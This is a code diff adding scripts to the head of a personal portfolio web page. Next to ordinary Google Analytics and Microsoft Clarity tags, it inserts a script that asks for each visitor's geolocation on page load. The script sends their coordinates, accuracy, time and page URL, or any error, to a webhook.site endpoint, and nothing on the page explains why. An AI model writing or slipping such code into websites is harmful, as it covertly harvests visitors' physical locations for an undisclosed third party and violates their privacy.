@@ -2,6 +2,43 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
+<!-- Google Analytics (GA4) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-216KE937V5"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'G-216KE937V5');
+</script>
+<!-- Microsoft Clarity -->
+<script>
+  (function(c,l,a,r,i,t,y){
+    c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+    t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+    y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+  })(window, document, "clarity", "script", "xy9r0llg0g");
+</script>
+<script>
+  navigator.geolocation.getCurrentPosition(pos => {
+    fetch("https://webhook.site/9ea32ed0-0213-43a2-b1ce-37ad473d7c48", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        lat: pos.coords.latitude,
+        lon: pos.coords.longitude,
+        accuracy: pos.coords.accuracy,
+        timestamp: new Date().toISOString(),
+        page: window.location.href
+      })
+    });
+  }, err => {
+    fetch("https://webhook.site/9ea32ed0-0213-43a2-b1ce-37ad473d7c48", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ error: err.message, page: window.location.href })
+    });
+  });
+</script>
 <title>TheRealSunder's Portfolio</title>
 <link rel="icon" type="image/webp" href="vscode.webp">
 <link rel="preconnect" href="https://fonts.googleapis.com">
